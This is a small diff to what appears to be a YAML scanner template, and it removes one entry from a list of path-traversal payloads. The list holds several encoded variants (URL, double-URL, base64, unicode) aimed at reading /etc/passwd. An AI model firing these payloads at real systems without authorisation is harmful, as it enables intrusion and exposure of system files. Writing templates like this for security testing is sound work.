@@ -77,7 +77,6 @@ http:
       payload:
         - "/etc/passwd"
         - "..././..././..././..././..././..././..././etc/passwd"
-        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
         - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
         - "Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
         - "%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd"
